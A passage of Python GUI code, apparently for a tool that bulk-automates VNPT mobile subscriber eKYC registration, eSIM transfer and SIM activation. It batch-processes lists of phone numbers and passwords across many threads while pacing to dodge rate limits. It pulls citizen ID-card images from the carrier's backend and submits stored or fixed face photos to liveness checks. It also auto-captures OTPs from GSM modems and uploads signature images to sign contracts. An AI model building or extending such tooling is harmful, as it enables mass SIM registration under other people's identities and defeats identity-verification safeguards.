                'API_SESSION_ID':     sess_val,
                'phone_number_login': ld.get('msisdn', msisdn_84),
                'KEY_ENCRYPT_AES':    _AMKEY,
                'BEARER_TOKEN':       _BT,
                'DEVICE_INFO':        _DI,
                'MAC_ADDRESS':        _MAC,
                '_saved_at':          __import__('time').strftime('%Y-%m-%d %H:%M:%S'),
            })
            with open(_session_file, 'w', encoding='utf-8') as _fj:
                __import__('json').dump(existing, _fj, ensure_ascii=False, indent=2)
            # Dong thoi cap nhat device_session.json chinh (cho single-thread mode)
            with open(DEVICE_SESSION_JSON, 'w', encoding='utf-8') as _fj:
                __import__('json').dump(existing, _fj, ensure_ascii=False, indent=2)

            # BUOC 3: ONEBSS + eKYC (truyen session file rieng)
            log(f"{prefix}[3/3] Bat dau eKYC...")
            try:
                if _batch_cancelled():
                    return False, 'DA DUNG THEO YEU CAU', False
                ok, name, msisdn_r, err_msg, already_completed = _fetch_worker(
                    mv_phone, skip_device=True, tag=tag,
                    _session_file=_session_file,
                )
                return ok, err_msg, already_completed
            finally:
                try:
                    os.remove(_session_file)
                except OSError:
                    pass

        except Exception as ex:
            log(f'{prefix}[AUTO] LOI: {ex}')
            import traceback
            log(f'{prefix}[AUTO] {traceback.format_exc()[:300]}')
            return False, f"Exception: {ex}", False

    # 
    # Main run logic (single or batch)
    # 
    def auto_run():
        if _batch_running['value']:
            dash_status.config(text="Batch dang chay; bam DUNG neu muon huy.", fg=YEL)
            return
        # Khong check token expiry - cu dung token hien tai
        tok = _ONEBSS_SESSION.get('token', '')
        if not tok and not _CBSS_RUNTIME.logged_in:
            dash_status.config(text="Chua dang nhap CBSS hoac OneBSS!", fg=ERR)
            return

        mv_phone = e_mv_phone_d.get().strip()
        mv_pass  = e_mv_pass_d.get().strip()

        # A direct pasted/typed batch takes priority over imported files.
        direct_raw = direct_phone_box.get('1.0', 'end')
        if direct_raw.strip():
            direct_accounts, direct_bad = _parse_txt_batch_lines(
                direct_raw.splitlines()
            )
            if not direct_accounts:
                dash_status.config(text="Ô SĐT trực tiếp không có số hợp lệ!", fg=ERR)
                return
            run_list = direct_accounts
            direct_phone_status.config(
                text=f"Sẽ chạy {len(run_list)} số"
                     + (f" ({direct_bad} dòng lỗi)" if direct_bad else ""),
                fg=OK if not direct_bad else YEL,
            )
            if direct_bad:
                log(f"[INPUT] Bỏ qua {direct_bad} dòng SĐT trực tiếp không hợp lệ")
        elif _batch_list:
            run_list = list(_batch_list)
        elif mv_phone and mv_pass:
            run_list = [(mv_phone, mv_pass)]
        else:
            dash_status.config(
                text="Nhập SĐT + mật khẩu, dán SĐT trực tiếp, hoặc Import TXT!",
                fg=ERR,
            )
            return

        try:
            n_threads = max(1, min(int(e_threads.get().strip() or '3'), 20))
        except ValueError:
            n_threads = 3

        total = len(run_list)
        _batch_stop_event.clear()
        _batch_running['value'] = True
        run_btn.config(state='disabled')
        stop_btn.config(state='normal')
        log_area.config(state='normal'); log_area.delete('1.0','end'); log_area.config(state='disabled')
        dash_status.config(text=f"Dang chay {total} so voi {n_threads} luong...", fg=YEL)
        log(f"=== BAT DAU: {total} so dien thoai | {n_threads} luong ===")

        _counter = {'ok': 0, 'fail': 0, 'total': total}
        _lock = threading.Lock()

        def _worker_task(item, idx):
            phone, pw = item
            tag = f"{idx+1}/{total}"
            if _batch_cancelled():
                return False
            log(f"[{tag}] Bat dau: {phone}")
            # Apply delay (avoid rate limiting)
            try: delay_s = float(e_delay.get().strip() or '0')
            except: delay_s = 0
            if delay_s > 0 and idx > 0:
                if _batch_stop_event.wait(delay_s * (idx % n_threads)) or _shutdown_event.is_set():
                    return False
            ok, err_msg, already_completed = _do_ekyc(phone, pw, tag=tag)
            if _batch_cancelled():
                return False
            # Ghi ket qua ra file
            try:
                result_txt = _append_txt_result(
                    phone, ok, already_completed, error_reason=err_msg
                )
                written_files = [os.path.basename(result_txt)]
                if ok:
                    written_files.append(
                        'complete_khong_can_xac_thuc.txt'
                        if already_completed else
                        'complete_vua_xac_thuc.txt'
                    )
                log(f"[{tag}][FILE] Da ghi {' + '.join(written_files)}")
            except Exception as _fe:
                log(f"[FILE] Loi ghi ket qua txt: {_fe}")

            with _lock:
                if ok: _counter['ok'] += 1
                else:  _counter['fail'] += 1


                done = _counter['ok'] + _counter['fail']
                set_status(
                    f"\u23f3 [{done}/{total}] \u2705 {_counter['ok']} OK  \u274c {_counter['fail']} FAIL",
                    YEL if done < total else (OK if _counter['fail'] == 0 else ERR)
                )
            return ok

        def _batch_runner():
            from concurrent.futures import ThreadPoolExecutor, as_completed
            pool = ThreadPoolExecutor(max_workers=n_threads)
            _batch_executor['value'] = pool
            futures = {}
            try:
                futures = {pool.submit(_worker_task, item, i): i for i, item in enumerate(run_list)}
                for fut in as_completed(futures):
                    if _batch_cancelled():
                        break
                    try: fut.result()
                    except Exception as ex: log(f"[FUTURE] Loi: {ex}")
            except Exception as ex:
                if not _batch_cancelled():
                    log(f"[BATCH] Loi tao/chay hang doi: {ex}")
            finally:
                cancelled = _batch_cancelled()
                if cancelled:
                    for future in futures:
                        future.cancel()
                pool.shutdown(wait=not _shutdown_event.is_set(), cancel_futures=True)
                _batch_executor['value'] = None
                _batch_running['value'] = False
                if not _shutdown_event.is_set():
                    root.after(0, lambda: run_btn.config(state='normal'))
                    root.after(0, lambda: stop_btn.config(state='disabled'))
            if _batch_stop_event.is_set() and not _shutdown_event.is_set():
                log('')
                log(f'=== DA DUNG: {_counter["ok"]} OK | {_counter["fail"]} FAIL; cac so chua chay da huy ===')
                set_status(
                    f'\u23f9 DA DUNG: {_counter["ok"]} OK  \u274c {_counter["fail"]} FAIL',
                    YEL,
                )
                return
            if _shutdown_event.is_set():
                return
            # Final summary is displayed in the UI only. Per-account results
            # were already written to the aggregate/detail TXT files above.
            log('')
            log('=' * 55)
            log(f'  HOAN THANH: {_counter["ok"]}/{total} THANH CONG  |  {_counter["fail"]}/{total} THAT BAI')
            log('=' * 55)
            set_status(
                f'\u2705 XONG: {_counter["ok"]}/{total} OK  \u274c {_counter["fail"]}/{total} FAIL',
                OK if _counter['fail'] == 0 else (YEL if _counter['ok'] > 0 else ERR)
            )

        threading.Thread(target=_batch_runner, daemon=True).start()

    def stop_batch():
        """Stop the active batch without closing the GUI or logging cancels."""
        if not _batch_running['value']:
            dash_status.config(text="Khong co batch dang chay.", fg=SUB)
            return
        _batch_stop_event.set()
        stop_btn.config(state='disabled')
        dash_status.config(text="Dang dung batch va cac tien trinh eKYC...", fg=YEL)
        log('[STOP] Da nhan yeu cau dung; dang huy hang doi...')
        executor = _batch_executor.get('value')
        if executor is not None:
            try:
                executor.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
        stopped_children = _terminate_active_children()
        log(f'[STOP] Da dung {stopped_children} tien trinh eKYC con.')

    # RUN / STOP buttons
    run_controls = tk.Frame(tab_dktttb, bg=BG)
    run_controls.pack(pady=(4, 6))
    run_btn = mkbtn(run_controls, "  \u25b6  CHAY DKTTTB  ", auto_run,
                    bg='#a6e3a1', fg='#1e1e2e', size=12)
    run_btn.pack(side='left', padx=(0, 8))
    stop_btn = mkbtn(run_controls, "  \u23f9  DUNG  ", stop_batch,
                     bg='#f38ba8', fg='#1e1e2e', size=12, state='disabled')
    stop_btn.pack(side='left')

    # ===== eSIM migration panel =====
    # The My VNPT eSIM migration screen only asks the customer for a backup
    # phone number and an email.  The login fields are repeated here so the
    # eSIM action is discoverable without confusing it with the DKTTTB batch
    # inputs above.  The password is read only in memory and is never saved by
    # this panel.
    esim_box = tk.LabelFrame(
        tab_esim, text="  DANG KY eSIM / CHUYEN SIM  ",
        bg=BG, fg=ACC, relief='groove', bd=1,
        font=('Segoe UI', 10, 'bold'), padx=8, pady=5
    )
    esim_box.pack(fill='both', expand=True, pady=(2, 5))
    mklbl(esim_box,
          "Nhap thong tin → Bam CHAY → Nhap OTP ky hop dong → Nhan QR eSIM.",
          fg=SUB, size=8, justify='left', anchor='w').pack(fill='x', pady=(0, 3))

    def _esim_inp_row(parent, label, width=27, show=None):
        row = tk.Frame(parent, bg=BG)
        row.pack(fill='x', pady=2)
        mklbl(row, label, bold=True, width=18, size=9).pack(side='left')
        entry = mkentry(row, show=show, width=width)
        entry.pack(side='left', padx=(5, 4), ipady=3)
        return entry

    e_esim_phone = _esim_inp_row(esim_box, "My VNPT phone:")
    e_esim_pass = _esim_inp_row(esim_box, "My VNPT password:", show='*')
    e_esim_backup = _esim_inp_row(esim_box, "So du phong:")
    e_esim_email = _esim_inp_row(esim_box, "Email:")
    # Reuse the currently selected My VNPT account as a convenience, but do
    # not copy the password into a second visible field.
    try:
        if e_mv_phone_d.get().strip():
            e_esim_phone.insert(0, e_mv_phone_d.get().strip())
    except Exception:
        pass

    def _esim_values():
        phone = e_esim_phone.get().strip() or e_mv_phone_d.get().strip()
        password = e_esim_pass.get() or e_mv_pass_d.get()
        backup = e_esim_backup.get().strip()
        email = e_esim_email.get().strip()
        if not phone or not password:
            raise EsimRegistrationError('Nhap My VNPT phone va password')
        if not backup:
            raise EsimRegistrationError('Nhap so dien thoai du phong')
        if not email or '@' not in email:
            raise EsimRegistrationError('Nhap email hop le')
        return phone, password, backup, email

    def _show_otp_dialog(phone, result_file, on_success,
                          title='Nhap OTP ky hop dong eSIM',
                          header='\U0001f4f1  XAC NHAN OTP KY HOP DONG eSIM',
                          log_cb=None):
        """Hien popup nhap OTP ky hop dong eSIM/SIM moi, goi on_success(otp) khi xac nhan."""
        log_fn = log_cb or esim_log
        otp_watch_stop = threading.Event()
        dlg = tk.Toplevel(root)
        dlg.title(title)
        dlg.configure(bg=BG)
        dlg.resizable(False, False)
        dlg.grab_set()
        dlg.transient(root)
        # Center dialog
        root.update_idletasks()
        x = root.winfo_x() + root.winfo_width() // 2 - 200
        y = root.winfo_y() + root.winfo_height() // 2 - 120
        dlg.geometry(f'400x230+{x}+{y}')

        tk.Label(dlg, text=header,
                 bg=BG, fg=ACC, font=('Segoe UI', 11, 'bold')).pack(pady=(16, 4))
        tk.Label(dlg, text=f'OTP da gui den {phone} (SIM dang ky)\nNhap ma 6 so de ky hop dong:',
                 bg=BG, fg=FG, font=('Segoe UI', 9), justify='center').pack()

        e_otp_dlg = tk.Entry(dlg, bg=CARD, fg=ACC, insertbackground=ACC,
                             font=('Consolas', 22, 'bold'), width=10, justify='center',
                             relief='flat')
        e_otp_dlg.pack(pady=(10, 4), ipady=6)
        e_otp_dlg.focus_set()

        lbl_dlg_err = tk.Label(dlg, text='', bg=BG, fg=ERR, font=('Segoe UI', 9))
        lbl_dlg_err.pack()

        btn_frame = tk.Frame(dlg, bg=BG)
        btn_frame.pack(pady=(6, 0))

        def _confirm():
            otp_val = e_otp_dlg.get().strip()
            if not re.fullmatch(r'\d{6}', otp_val):
                lbl_dlg_err.config(text='OTP phai gom dung 6 chu so!')
                return
            otp_watch_stop.set()
            dlg.destroy()
            on_success(otp_val)

        def _cancel():
            otp_watch_stop.set()
            dlg.destroy()
            set_status('Da huy ky hop dong.', YEL)

        tk.Button(btn_frame, text='  \u2714  XAC NHAN  ', command=_confirm,
                  bg=OK, fg='#1e1e2e', relief='flat',
                  font=('Segoe UI', 10, 'bold'), padx=12, pady=5).pack(side='left', padx=(0, 8))
        tk.Button(btn_frame, text='  Huy  ', command=_cancel,
                  bg=CARD, fg=FG, relief='flat',
                  font=('Segoe UI', 9), padx=8, pady=5).pack(side='left')
        e_otp_dlg.bind('<Return>', lambda e: _confirm())

        def _watch_toolgsm_otp():
            # Start at the current end of each file; only OTP lines written
            # after this dialog appears can be consumed, avoiding stale codes.
            offsets = {}
            for path in _toolgsm_log_paths():
                try:
                    offsets[path] = os.path.getsize(path)
                except OSError:
                    offsets[path] = 0
            while not otp_watch_stop.wait(0.7):
                for path in _toolgsm_log_paths():
                    try:
                        size = os.path.getsize(path)
                        offset = offsets.get(path, 0)
                        if size < offset:
                            offset = 0  # log rotated/truncated
                        if size <= offset:
                            offsets[path] = size
                            continue
                        with open(path, 'r', encoding='utf-8', errors='replace') as log_file:
                            log_file.seek(offset)
                            chunk = log_file.read()
                        offsets[path] = size
                    except (OSError, UnicodeError):
                        continue
                    for line in chunk.splitlines():
                        code = _otp_from_toolgsm_line(line)
                        if not code:
                            continue

                        def _put_code(value=code, source=path):
                            if otp_watch_stop.is_set():
                                return
                            try:
                                if not dlg.winfo_exists():
                                    otp_watch_stop.set()
                                    return
                                e_otp_dlg.delete(0, 'end')
                                e_otp_dlg.insert(0, value)
                                lbl_dlg_err.config(text=f'GSM da nhan OTP: {value}', fg=OK)
                                log_fn(f'Tu dong nhan OTP {value} tu GSM: {source}')
                                set_status('Da nhan OTP tu GSM; bam XAC NHAN de ky hop dong.', OK)
                                e_otp_dlg.focus_set()
                            except tk.TclError:
                                otp_watch_stop.set()

                        root.after(0, _put_code)
                        return

        gsm_paths = [p for p in _toolgsm_log_paths() if p and os.path.isfile(p)]
        if gsm_paths:
            threading.Thread(target=_watch_toolgsm_otp, daemon=True).start()

    def _show_qr_result(qr_string, phone):
        """Hien cua so QR eSIM ket qua."""
        qr_win = tk.Toplevel(root)
        qr_win.title(f'QR eSIM - {phone}')
        qr_win.configure(bg=BG)
        qr_win.resizable(False, False)
        root.update_idletasks()
        x = root.winfo_x() + 50; y = root.winfo_y() + 50
        qr_win.geometry(f'520x380+{x}+{y}')

        tk.Label(qr_win, text='\U0001f4f1  QR eSIM DA SAN SANG!',
                 bg=BG, fg=OK, font=('Segoe UI', 13, 'bold')).pack(pady=(18, 4))
        tk.Label(qr_win, text=f'So: {phone}  |  Quet QR nay tren thiet bi de kich hoat eSIM.',
                 bg=BG, fg=FG, font=('Segoe UI', 9)).pack()

        # Hien QR string de copy
        qr_box = tk.Text(qr_win, height=5, bg=CARD, fg=ACC,
                         font=('Consolas', 8), relief='flat', wrap='word')
        qr_box.insert('1.0', qr_string)
        qr_box.config(state='disabled')
        qr_box.pack(fill='x', padx=16, pady=(10, 6))

        # Render QR image neu co thu vien qrcode
        try:
            import qrcode
            from PIL import Image as _PILImg, ImageTk as _PILTk
            qr_img = qrcode.make(qr_string)
            qr_img = qr_img.resize((220, 220), _PILImg.LANCZOS)
            _qr_photo = _PILTk.PhotoImage(qr_img)
            qr_canvas = tk.Label(qr_win, image=_qr_photo, bg=BG)
            qr_canvas.image = _qr_photo
            qr_canvas.pack(pady=(4, 0))
        except Exception:
            tk.Label(qr_win, text='(Cai pip install qrcode pillow de hien thi anh QR)',
                     bg=BG, fg=SUB, font=('Segoe UI', 8)).pack()

        def _copy_qr():
            qr_win.clipboard_clear()
            qr_win.clipboard_append(qr_string)
            btn_copy.config(text='\u2714 Da sao chep!')
        btn_copy = tk.Button(qr_win, text='  Sao chep QR string  ', command=_copy_qr,
                             bg=ACC, fg='#1e1e2e', relief='flat',
                             font=('Segoe UI', 9, 'bold'), padx=10, pady=4)
        btn_copy.pack(pady=(8, 4))
        tk.Button(qr_win, text='Dong', command=qr_win.destroy,
                  bg=CARD, fg=FG, relief='flat', font=('Segoe UI', 9)).pack()

    def _run_esim_full():
        """Full eSIM flow: tao yeu cau → eKYC + liveness → hop dong → OTP popup → QR."""
        try:
            phone, password, backup, email = _esim_values()
        except Exception as exc:
            esim_log(f'[ESIM] LOI NHAP LIEU: {exc}')
            set_status(str(exc), ERR)
            return
        if not _ONEBSS_SESSION.get('token', '') and not _CBSS_RUNTIME.logged_in:
            esim_log('[ESIM] LOI: Chua dang nhap CBSS hoac OneBSS.')
            set_status('Chua dang nhap CBSS hoac OneBSS! Hay dang nhap truoc.', ERR)
            return

        esim_log_area.config(state='normal')
        esim_log_area.delete('1.0', 'end')
        esim_log_area.config(state='disabled')
        set_status('\u23f3 Dang chay eSIM (buoc 1: tao yeu cau + eKYC)...', YEL)
        esim_log(f'[ESIM] === BAT DAU DANG KY eSIM cho {phone} ===')
        digits = re.sub(r'\D', '', phone)
        result_file = os.path.join(HISTORY_DIR, f'esim_result_{digits}.json')

        def _step1_create():
            try:
                # Step 1: Use the local anh cache first; query CBSS only when
                # type 1, type 2, or the type-3 portrait is missing.
                esim_log('[ESIM] Buoc 1/4: Kiem tra anh trong thu muc anh...')
                paths = ensure_cccd_images(phone, log_cb=esim_log)
                esim_log(f"[ESIM] CCCD mat truoc: {paths.get('front') or '(thieu)'}")
                esim_log(f"[ESIM] CCCD mat sau: {paths.get('back') or '(thieu)'}")
                esim_log(f"[ESIM] Anh chan dung type 3: {paths.get('portrait') or '(thieu)'}")

                # Step 2: Tao yeu cau chuyen eSIM (createRequestChangeEsim)
                esim_log('[ESIM] Buoc 2/4: Tao yeu cau chuyen eSIM...')
                set_status('\u23f3 Dang tao yeu cau chuyen eSIM...', YEL)
                cfg_create = {
                    'mode': 'change',
                    'login_msisdn': phone,
                    'login_password': password,
                    'backup_phone_number': backup,
                    'email': email,
                    'result_file': result_file,
                }
                result_create = run_esim_registration(cfg_create, log_cb=esim_log)
                req_order_id = result_create.get('request_order_id') or result_create.get('request_id')
                esim_log(f'[ESIM] Tao yeu cau OK. requestOrderId={req_order_id}')

                # Step 3: eKYC (IDG + liveness-3d + createContractEsim)
                esim_log('[ESIM] Buoc 3/4: Chay eKYC + liveness + tao hop dong...')
                set_status('\u23f3 Dang chay IDG eKYC + liveness (0.889)...', YEL)
                cfg_ekyc = {
                    'mode': 'change',
                    'continue_ekyc': True,
                    'login_msisdn': phone,
                    'login_password': password,
                    'backup_phone_number': backup,
                    'contact_phone': backup,
                    'email': email,
                    'result_file': result_file,
                }
                result_ekyc = run_esim_registration(cfg_ekyc, log_cb=esim_log)
                contract_id = _esim_deep_find(result_ekyc.get('contract_result', {}), 'contractId', 'contract_id')
                esim_log(f'[ESIM] eKYC + hop dong OK. contractId={contract_id}')

                # Step 4: Gui OTP ky hop dong
                esim_log('[ESIM] Buoc 4/4: Gui OTP ky hop dong...')
                set_status('\u23f3 Dang gui OTP ky hop dong...', YEL)
                run_esim_contract_send_otp({'result_file': result_file}, log_cb=esim_log)
                esim_log('[ESIM] OTP da gui! Cho nguoi dung nhap OTP...')
                set_status('\u270d  Nhap OTP 6 so de ky hop dong eSIM!', ACC)

                # Hien popup OTP tren main thread
                # OTP eContract thực tế được VNPT gửi về SIM đăng ký/My VNPT,
                # không phải số dự phòng dùng làm contactPhone trong hồ sơ.
                root.after(0, lambda: _show_otp_dialog(phone, result_file, _step2_verify_otp))

            except Exception as exc:
                esim_log(f'[ESIM] THAT BAI buoc 1-4: {exc}')
                set_status(f'eSIM loi: {str(exc)[:80]}', ERR)

        def _prompt_signature_and_fetch_qr():
            """Ask for the handwritten signImg1 required by eContract v2/sign."""
            from tkinter import filedialog
            signature_file = filedialog.askopenfilename(
                title='Chon anh chu ky viet tay (PNG/JPG)',
                filetypes=[('Anh chu ky', '*.png *.jpg *.jpeg'), ('Tat ca', '*.*')])
            if not signature_file:
                esim_log('[ESIM] Chua chon anh chu ky; hop dong van cho ky.')
                set_status('OTP da xac thuc; can anh chu ky de hoan tat.', YEL)
                return
            set_status('Dang gui chu ky signImg1...', YEL)
            esim_log(f'[ESIM] Upload chu ky: {os.path.basename(signature_file)}')

            def _signature_worker():
                try:
                    signed_result = run_esim_contract_submit_signature(
                        {'result_file': result_file}, signature_file,
                        log_cb=esim_log)
                    qr_result = run_esim_postsign_qr(
                        {'result_file': result_file}, log_cb=esim_log,
                        retries=3, wait_seconds=10)
                    qr = qr_result.get('qr') or _esim_deep_find(
                        qr_result, 'qrString', 'qr_string', 'qr', 'qrCode')
                    if qr:
                        esim_log('[ESIM] Ky day du va da nhan QR eSIM.')
                        set_status('\u2705 eSIM HOAN THANH - QR da hien thi!', OK)
                        root.after(0, lambda: _show_qr_result(str(qr), phone))
                    else:
                        esim_log('[ESIM] Ky day du; VNPT chua cap serial_sim/QR, bam LAY QR SAU KHI KY sau.')
                        set_status('\u2705 Da ky day du; dang cho VNPT cap QR.', OK)
                except Exception as exc:
                    esim_log(f'[ESIM] Upload chu ky/lay QR loi: {exc}')
                    set_status(f'Ky chu ky loi: {str(exc)[:80]}', ERR)

            threading.Thread(target=_signature_worker, daemon=True).start()

        def _step2_verify_otp(otp_val):
            set_status('\u23f3 Dang xac nhan OTP ky hop dong...', YEL)
            esim_log(f'[ESIM] Xac nhan OTP hop dong...')

            def _verify_worker():
                try:
                    verify_result = run_esim_contract_verify_otp(
                        {'result_file': result_file}, otp_val, log_cb=esim_log)
                    esim_log('[ESIM] OTP hop le; can upload chu ky viet tay de hoan tat hop dong.')
                    set_status('\u270d  OTP dung. Chon anh chu ky viet tay de ky tiep.', ACC)
                    root.after(0, _prompt_signature_and_fetch_qr)
                except Exception as exc:
                    esim_log(f'[ESIM] Xac nhan OTP loi: {exc}')
                    set_status(f'OTP sai hoac het han: {str(exc)[:60]}', ERR)
                    # Hien lai popup de nhap lai
                    root.after(0, lambda: _show_otp_dialog(phone, result_file, _step2_verify_otp))

            threading.Thread(target=_verify_worker, daemon=True).start()

        threading.Thread(target=_step1_create, daemon=True).start()

    def _fetch_qr_after_signed():
        phone = e_esim_phone.get().strip() or e_mv_phone_d.get().strip()
        if not phone:
            set_status('Chua co so thue bao eSIM.', ERR)
            return
        digits = re.sub(r'\D', '', phone)
        result_file = os.path.join(HISTORY_DIR, f'esim_result_{digits}.json')
        set_status('Dang kiem tra serial_sim va lay QR...', YEL)
        esim_log('[ESIM QR] Bat dau lay QR sau khi ky...')

        def _worker():
            try:
                qr_result = run_esim_postsign_qr(
                    {'result_file': result_file}, log_cb=esim_log,
                    retries=6, wait_seconds=10)
                qr = qr_result.get('qr') or _esim_deep_find(
                    qr_result, 'qrString', 'qr_string', 'qr', 'qrCode')
                if qr:
                    esim_log('[ESIM QR] Da lay duoc QR.')
                    set_status('QR eSIM da san sang.', OK)
                    root.after(0, lambda: _show_qr_result(str(qr), phone))
                else:
                    esim_log('[ESIM QR] VNPT chua cap serial_sim/QR; thu lai sau.')
                    set_status('Chua co QR; VNPT dang cap serial.', YEL)
            except Exception as exc:
                esim_log(f'[ESIM QR] Loi lay QR: {exc}')
                set_status(f'Lay QR loi: {str(exc)[:80]}', ERR)

        threading.Thread(target=_worker, daemon=True).start()

    def _submit_existing_signature():
        """Finish an already OTP-verified contract from the eSIM tab."""
        from tkinter import filedialog
        phone = e_esim_phone.get().strip() or e_mv_phone_d.get().strip()
        if not phone:
            set_status('Chua co so thue bao eSIM.', ERR)
            return
        signature_file = filedialog.askopenfilename(
            title='Chon anh chu ky viet tay (PNG/JPG)',
            filetypes=[('Anh chu ky', '*.png *.jpg *.jpeg'), ('Tat ca', '*.*')])
        if not signature_file:
            return
        result_file = os.path.join(HISTORY_DIR, f'esim_result_{re.sub(r"\D", "", phone)}.json')
        set_status('Dang upload chu ky signImg1...', YEL)
        esim_log(f'[ESIM] Upload chu ky cho hop dong hien tai: {os.path.basename(signature_file)}')

        def _worker():
            try:
                run_esim_contract_submit_signature(
                    {'result_file': result_file}, signature_file, log_cb=esim_log)
                qr_result = run_esim_postsign_qr(
                    {'result_file': result_file}, log_cb=esim_log,
                    retries=3, wait_seconds=10)
                qr = qr_result.get('qr') or _esim_deep_find(
                    qr_result, 'qrString', 'qr_string', 'qr', 'qrCode')
                if qr:
                    set_status('eSIM hoan tat - QR da san sang.', OK)
                    root.after(0, lambda: _show_qr_result(str(qr), phone))
                else:
                    set_status('Da ky chu ky; VNPT dang cap serial/QR.', YEL)
                    esim_log('[ESIM] Da upload chu ky; bam LAY QR SAU KHI KY sau.')
            except Exception as exc:
                esim_log(f'[ESIM] Ky hop dong hien tai loi: {exc}')
                set_status(f'Ky hop dong loi: {str(exc)[:80]}', ERR)

        threading.Thread(target=_worker, daemon=True).start()

    # --- Action buttons ---
    esim_action_row2 = tk.Frame(esim_box, bg=BG)
    esim_action_row2.pack(fill='x', pady=(4, 0))

    mkbtn(esim_action_row2, '  \u25b6  CHAY DANG KY eSIM  ', _run_esim_full,
          bg='#a6e3a1', fg='#1e1e2e', size=11).pack(side='left')
    mkbtn(esim_action_row2, '  TAI ANH MAT  ', lambda: [
        set_status('Dang tai anh mat...', YEL),
        threading.Thread(target=lambda: (
            lambda paths: [
                esim_log(f"[ESIM] anh mat: {paths.get('portrait') or '(khong co)'}"),
                set_status('Da tai anh mat; khong tai CCCD.', OK)
            ]
        )(ensure_cccd_images(
            e_esim_phone.get().strip() or e_mv_phone_d.get().strip(),
            log_cb=esim_log
        )), daemon=True).start()
    ], bg='#45475a', fg=FG, size=9).pack(side='left', padx=(8, 0))
    mkbtn(esim_action_row2, '  LAY QR SAU KHI KY  ', _fetch_qr_after_signed,
          bg='#89b4fa', fg='#1e1e2e', size=9).pack(side='left', padx=(8, 0))
    mkbtn(esim_action_row2, '  KY CHU KY PNG  ', _submit_existing_signature,
          bg='#f9e2af', fg='#1e1e2e', size=9).pack(side='left', padx=(8, 0))

    # Dedicated eSIM log area (same live queue/clear controls as DKTTTB).
    esim_log_hdr = tk.Frame(esim_box, bg=BG)
    esim_log_hdr.pack(fill='x', pady=(8, 0))
    mklbl(esim_log_hdr, " Log eSIM:", bold=True, size=9, fg=ACC).pack(side='left')
    esim_auto_scroll_var = tk.BooleanVar(value=True)
    tk.Checkbutton(esim_log_hdr, text="Tu cuon", variable=esim_auto_scroll_var,
                   bg=BG, fg=SUB, activebackground=BG, activeforeground=FG,
                   selectcolor=CARD, font=('Segoe UI', 8)).pack(side='right')

    def _clear_esim_log():
        esim_log_area.config(state='normal')
        esim_log_area.delete('1.0', 'end')
        esim_log_area.config(state='disabled')

    tk.Button(esim_log_hdr, text="Xoa log", bg=CARD, fg=SUB,
              relief='flat', font=('Segoe UI', 8), padx=6,
              command=_clear_esim_log).pack(side='right', padx=(0, 6))

    esim_log_area = tk.Text(esim_box, height=13, bg='#181825', fg='#a6e3a1',
                            font=('Consolas', 8), relief='flat',
                            state='disabled', wrap='word')
    esim_log_area.pack(fill='both', expand=True, pady=(2, 0))
    root.after(80, _flush_esim_log)

    # ===== ACTIVE_SIM tab =====
    active_sim_box = tk.LabelFrame(
        tab_active_sim, text='  KÍCH HOẠT SIM MỚI / ACTIVE_SIM  ',
        bg=BG, fg=ACC, relief='groove', bd=1,
        font=('Segoe UI', 10, 'bold'), padx=8, pady=5
    )
    active_sim_box.pack(fill='both', expand=True, pady=(2, 5))
    mklbl(
        active_sim_box,
        'Luồng: nhập serial SIM → chọn phương thức → xác thực khuôn mặt → xác nhận thông tin → ký hợp đồng.',
        fg=SUB, size=8, justify='left', anchor='w'
    ).pack(fill='x', pady=(0, 4))

    def _active_sim_inp_row(parent, label, width=27, show=None):
        row = tk.Frame(parent, bg=BG)
        row.pack(fill='x', pady=2)
        mklbl(row, label, bold=True, width=18, size=9).pack(side='left')
        entry = mkentry(row, show=show, width=width)
        entry.pack(side='left', padx=(5, 4), ipady=3)
        return entry

    # The phone app only asks for the SIM serial and CCCD.  ACTIVE_SIM creates
    # its device/RSA context and challenge automatically, without login fields.
    e_active_sim_serial = _active_sim_inp_row(
        active_sim_box, 'Serial SIM:', width=27)
    active_sim_auth_row = tk.Frame(active_sim_box, bg=BG)
    active_sim_auth_row.pack(fill='x', pady=2)
    mklbl(active_sim_auth_row, 'Phương thức:', bold=True, width=18, size=9).pack(side='left')
    active_sim_authen_var = tk.StringVar(value='REUSE_INFO')
    active_sim_authen_box = ttk.Combobox(
        active_sim_auth_row, textvariable=active_sim_authen_var,
        values=('REUSE_INFO',),
        state='readonly', width=21
    )
    active_sim_authen_box.pack(side='left', padx=(5, 4), ipady=2)

    e_active_sim_cccd = _active_sim_inp_row(
        active_sim_box, 'Số CCCD:', width=22)

    active_sim_portrait_mode_row = tk.Frame(active_sim_box, bg=BG)
    active_sim_portrait_mode_row.pack(fill='x', pady=2)
    mklbl(
        active_sim_portrait_mode_row, 'Nguồn ảnh mặt:',
        bold=True, width=18, size=9
    ).pack(side='left')
    active_sim_portrait_mode_var = tk.StringVar(value='fixed')
    for _portrait_text, _portrait_value in (
            ('Ảnh cố định', 'fixed'),
            ('Theo thư mục anh/<CCCD>.png', 'folder')):
        tk.Radiobutton(
            active_sim_portrait_mode_row,
            text=_portrait_text,
            variable=active_sim_portrait_mode_var,
            value=_portrait_value,
            bg=BG, fg=FG,
            activebackground=BG, activeforeground=FG,
            selectcolor=CARD,
            font=('Segoe UI', 8),
        ).pack(side='left', padx=(5, 7))

    active_sim_portrait_row = tk.Frame(active_sim_box, bg=BG)
    active_sim_portrait_row.pack(fill='x', pady=2)
    mklbl(
        active_sim_portrait_row, 'Ảnh chân dung:',
        bold=True, width=18, size=9
    ).pack(side='left')
    e_active_sim_portrait = mkentry(active_sim_portrait_row, width=22)
    e_active_sim_portrait.pack(side='left', padx=(5, 4), ipady=3)

    def _browse_active_sim_portrait():
        from tkinter import filedialog
        selected = filedialog.askopenfilename(
            title='Chọn ảnh chân dung cố định',
            filetypes=[
                ('Ảnh chân dung', '*.png *.jpg *.jpeg *.webp'),
                ('Tất cả', '*.*'),
            ],
        )
        if selected:
            e_active_sim_portrait.delete(0, 'end')
            e_active_sim_portrait.insert(0, selected)

    active_sim_portrait_browse_btn = mkbtn(
        active_sim_portrait_row, 'Chọn file...',
        _browse_active_sim_portrait, bg=CARD, fg=FG, size=8)
    active_sim_portrait_browse_btn.pack(side='left')

    def _open_active_sim_portrait_folder():
        os.makedirs(TEMP_FACES_DIR, exist_ok=True)
        try:
            os.startfile(TEMP_FACES_DIR)
        except Exception as exc:
            set_status(f'Không mở được thư mục ảnh: {exc}', ERR)

    active_sim_portrait_folder_btn = mkbtn(
        active_sim_portrait_row, 'Mở thư mục anh',
        _open_active_sim_portrait_folder, bg=CARD, fg=FG, size=8)
    active_sim_portrait_folder_btn.pack(side='left', padx=(5, 0))

